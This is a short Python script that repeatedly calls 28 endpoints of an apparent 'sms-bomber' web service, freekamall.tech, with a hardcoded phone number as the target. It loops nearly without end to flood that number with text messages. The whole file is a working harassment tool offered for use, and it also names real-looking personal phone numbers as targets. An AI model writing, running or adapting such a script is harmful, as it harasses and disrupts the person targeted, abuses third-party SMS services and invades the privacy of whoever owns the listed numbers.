import requests

import time

from random import *

mobile_number = "7067396050"

url = "https://freekamall.tech/sms-bomber/1.php?sent=2&&count=100&&mobno=7999187239"
count=0
for x in range(99999999999):
    for i in range(1,29):
        req = requests.get("https://freekamall.tech/sms-bomber/"+str(i)+".php?sent=2&&count=100&&mobno="+mobile_number)
        print(f"{str(count)} Time Sended")
        count=count+1
        time.sleep(30)
        
